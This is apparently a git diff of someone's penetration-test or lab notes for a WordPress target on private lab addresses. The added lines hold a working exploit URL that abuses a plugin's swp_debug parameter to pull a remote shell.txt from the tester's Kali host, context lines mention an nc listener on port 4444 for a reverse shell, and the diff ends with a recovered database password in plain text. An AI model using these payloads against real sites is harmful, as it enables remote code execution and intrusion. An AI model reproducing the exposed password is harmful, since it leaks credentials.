@@ -1,6 +1,9 @@
 # IP: 192.168.68.123 
 # New-ip: 192.168.188.123
 
+# kali-ip: 192.168.49.188 
+http:// 192.168.188.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.188/shell.txt
+
 # Enumeration
 
 # Nmap
@@ -290,4 +293,9 @@ and then setup a listener--> nc -lvp 4444
 http://192.168.89.123/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.89/shell.txt
 -->http://192.168.89.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.109/shell.txt
 
+```
+
+
+```python
+Database password:  R3&]vzhHmMn9,:-5
 ```
